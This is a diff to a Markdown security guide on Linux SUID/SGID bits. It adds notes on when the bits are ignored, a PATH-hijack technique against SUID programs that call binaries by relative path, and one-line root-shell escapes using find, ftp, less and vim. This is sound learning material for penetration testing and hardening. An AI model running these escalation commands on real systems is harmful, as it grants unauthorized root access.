@@ -45,7 +45,43 @@ The same principles apply to SGID binaries. They can be spotted by the `s` permi
 sudo chmod g+s file
 ```
 
+#### Limitations
+
+* Just like capabilities, SUID and GUID bits are cleared when a file is copied with `cp`.
+* Some partitions of the linux file system are mounted with the `nosuid` option. In this case the SUID bit is ignored for binaries placed inside the partition. It is a common good practice for tmpfs partitions like `/tmp` or`/run`. You can spot these partitions  by inspecting the `/proc/mounts` pseudo-file for a `nosuid` flag. 
+
 ## Practice
+
+#### Relative path calls
+
+If a SUID binary calls to another one using a relative path instead of absolute.
+
+```c
+int function(int argc, char *argv[]){
+···
+    system("cat") // instead of system("/usr/bin/cat")
+···
+}
+```
+
+You can add a `cat` binary to the current working directory and edit the `PATH` environment variable so it is found first : `PATH=.:$PATH`
+
+#### Common SUID privilege escalation
+
+Known binaries that allow command execution and can be exploited :
+
+```text
+find -exec sh -p \; -quit
+
+ftp
+>!sh -p
+
+less
+>!sh -p
+
+# Apparently system-dependent
+vim -c ':!sh -p'
+```
 
 ## References
 
